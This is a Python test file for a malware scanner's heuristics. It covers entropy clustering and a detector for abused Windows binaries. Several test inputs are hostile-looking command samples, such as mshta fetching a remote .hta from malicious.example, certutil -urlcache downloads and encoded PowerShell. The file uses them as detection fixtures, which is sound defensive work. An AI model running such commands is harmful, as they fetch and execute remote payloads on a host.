"""Tests for shared heuristic models and helpers."""

from __future__ import annotations

import importlib
from types import MappingProxyType

import pytest
from malscan_worker.analyzers.base import AnalyzerResult


def test_make_hit_builds_stable_object() -> None:
    models = importlib.import_module("malscan_worker.heuristics.models")

    hit = models.make_hit(
        key="packed_binary",
        category="structure",
        scope="direct",
        role="detection",
        severity="weak",
        confidence=0.6,
        summary="Binary appears packed",
        evidence={"section": ".text"},
        tags=("packer", "entropy"),
    )

    assert hit == models.HeuristicHit(
        key="packed_binary",
        category="structure",
        scope="direct",
        role="detection",
        severity="weak",
        confidence=0.6,
        summary="Binary appears packed",
        evidence={"section": ".text"},
        tags=("packer", "entropy"),
    )


def test_make_hit_freezes_evidence_against_source_mutation() -> None:
    models = importlib.import_module("malscan_worker.heuristics.models")

    source_evidence = {
        "section": ".text",
        "offsets": [1, 2],
        "nested": {"flag": True},
    }

    hit = models.make_hit(
        key="packed_binary",
        category="structure",
        scope="direct",
        role="detection",
        severity="weak",
        confidence=0.6,
        summary="Binary appears packed",
        evidence=source_evidence,
        tags=("packer",),
    )

    source_evidence["section"] = ".data"
    source_evidence["offsets"].append(3)
    source_evidence["nested"]["flag"] = False

    assert hit.evidence["section"] == ".text"
    assert hit.evidence["offsets"] == (1, 2)
    assert hit.evidence["nested"] == MappingProxyType({"flag": True})

    with pytest.raises(TypeError):
        hit.evidence["section"] = ".rdata"  # type: ignore[index]

    with pytest.raises(TypeError):
        hit.evidence["nested"]["flag"] = False  # type: ignore[index]


def test_importing_both_modules_succeeds() -> None:
    heuristics_models = importlib.import_module("malscan_worker.heuristics.models")
    analyzers_base = importlib.import_module("malscan_worker.analyzers.base")

    assert heuristics_models.HeuristicHit.__name__ == "HeuristicHit"
    assert analyzers_base.AnalyzerResult.__name__ == "AnalyzerResult"


def test_analyzer_result_defaults_heuristics_to_empty_list() -> None:
    result = AnalyzerResult(analyzer_name="test", format_type="TEST")

    assert result.heuristics == []


def test_evaluate_entropy_regions_emits_cluster_hit_for_two_high_regions() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_entropy_regions(
        "direct",
        [
            {"name": ".text", "entropy": 7.3},
            {"name": ".rsrc", "entropy": 7.2},
            {"name": ".data", "entropy": 6.1},
        ],
    )

    assert hits == [
        common.make_hit(
            key="entropy.high_region_cluster",
            category="content",
            scope="direct",
            role="signal",
            severity="medium",
            confidence=0.72,
            summary="Multiple regions have high entropy",
            evidence={
                "regions": (
                    {"name": ".text", "entropy": 7.3},
                    {"name": ".rsrc", "entropy": 7.2},
                ),
                "count": 2,
                "threshold": 7.2,
            },
            tags=("entropy", "regions"),
        )
    ]


def test_evaluate_entropy_regions_returns_empty_when_fewer_than_two_qualify() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_entropy_regions(
        "direct",
        [
            {"name": ".text", "entropy": 7.19},
            {"name": ".rsrc", "entropy": 7.2},
        ],
    )

    assert hits == []


def test_evaluate_lolbin_chain_emits_reference_only_for_bare_reference() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "archive_entry", "The script mentions certutil for troubleshooting."
    )

    assert hits == [
        common.make_hit(
            key="lolbin.reference_only",
            category="behavior",
            scope="archive_entry",
            role="signal",
            severity="weak",
            confidence=0.52,
            summary="LOLBIN reference found without execution context",
            evidence={"lolbins": ("certutil",)},
            tags=("lolbin", "reference"),
        )
    ]


def test_evaluate_lolbin_chain_emits_execution_chain_for_remote_execution_context() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "direct",
        "mshta.exe https://malicious.example/payload.hta && start-process calc",
    )

    assert hits == [
        common.make_hit(
            key="lolbin.execution_chain",
            category="behavior",
            scope="direct",
            role="detection",
            severity="medium",
            confidence=0.8,
            summary="LOLBIN appears with execution-chain context",
            evidence={
                "lolbins": ("mshta",),
                "signals": ("remote_url", "execution_primitive"),
            },
            tags=("lolbin", "execution", "network"),
        )
    ]


def test_evaluate_lolbin_chain_emits_execution_chain_for_encoded_payload_context() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "direct",
        "powershell -enc SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA==",
    )

    assert hits == [
        common.make_hit(
            key="lolbin.execution_chain",
            category="behavior",
            scope="direct",
            role="detection",
            severity="medium",
            confidence=0.8,
            summary="LOLBIN appears with execution-chain context",
            evidence={
                "lolbins": ("powershell",),
                "signals": ("encoded_payload",),
            },
            tags=("lolbin", "execution", "encoded"),
        )
    ]


def test_evaluate_lolbin_chain_keeps_reference_only_when_remote_url_is_not_local_context() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "archive_entry",
        (
            "Documentation references certutil for certificate tasks. "
            "See https://learn.example/certutil for details."
        ),
    )

    assert hits == [
        common.make_hit(
            key="lolbin.reference_only",
            category="behavior",
            scope="archive_entry",
            role="signal",
            severity="weak",
            confidence=0.52,
            summary="LOLBIN reference found without execution context",
            evidence={"lolbins": ("certutil",)},
            tags=("lolbin", "reference"),
        )
    ]


def test_evaluate_lolbin_chain_keeps_reference_only_for_url_path_encodedcommand_fragment() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "archive_entry",
        (
            "The guide mentions powershell and links to "
            "https://docs.example/encodedcommand/help for background."
        ),
    )

    assert hits == [
        common.make_hit(
            key="lolbin.reference_only",
            category="behavior",
            scope="archive_entry",
            role="signal",
            severity="weak",
            confidence=0.52,
            summary="LOLBIN reference found without execution context",
            evidence={"lolbins": ("powershell",)},
            tags=("lolbin", "reference"),
        )
    ]


def test_evaluate_lolbin_chain_keeps_reference_only_for_nonlocal_execution_word() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "archive_entry",
        (
            "The runbook mentions mshta for legacy tooling. Later, start-process is "
            "documented as a separate shell example."
        ),
    )

    assert hits == [
        common.make_hit(
            key="lolbin.reference_only",
            category="behavior",
            scope="archive_entry",
            role="signal",
            severity="weak",
            confidence=0.52,
            summary="LOLBIN reference found without execution context",
            evidence={"lolbins": ("mshta",)},
            tags=("lolbin", "reference"),
        )
    ]


def test_evaluate_lolbin_chain_emits_execution_chain_for_flagged_certutil_urlcache_command() -> (
    None
):
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "direct",
        "certutil -urlcache -f https://x",
    )

    assert hits == [
        common.make_hit(
            key="lolbin.execution_chain",
            category="behavior",
            scope="direct",
            role="detection",
            severity="medium",
            confidence=0.8,
            summary="LOLBIN appears with execution-chain context",
            evidence={
                "lolbins": ("certutil",),
                "signals": ("remote_url",),
            },
            tags=("lolbin", "execution", "network"),
        )
    ]


def test_evaluate_lolbin_chain_emits_execution_chain_for_flagged_powershell_encoded_command() -> (
    None
):
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "direct",
        "powershell -nop -enc AAAA",
    )

    assert hits == [
        common.make_hit(
            key="lolbin.execution_chain",
            category="behavior",
            scope="direct",
            role="detection",
            severity="medium",
            confidence=0.8,
            summary="LOLBIN appears with execution-chain context",
            evidence={
                "lolbins": ("powershell",),
                "signals": ("encoded_payload",),
            },
            tags=("lolbin", "execution", "encoded"),
        )
    ]


def test_evaluate_lolbin_chain_keeps_reference_only_for_benign_doc_with_flags() -> None:
    common = importlib.import_module("malscan_worker.heuristics.common")

    hits = common.evaluate_lolbin_chain(
        "archive_entry",
        (
            "The admin guide mentions certutil -urlcache as an example flag set, and "
            "links readers to general troubleshooting notes."
        ),
    )

    assert hits == [
        common.make_hit(
            key="lolbin.reference_only",
            category="behavior",
            scope="archive_entry",
            role="signal",
            severity="weak",
            confidence=0.52,
            summary="LOLBIN reference found without execution context",
            evidence={"lolbins": ("certutil",)},
            tags=("lolbin", "reference"),
        )
    ]
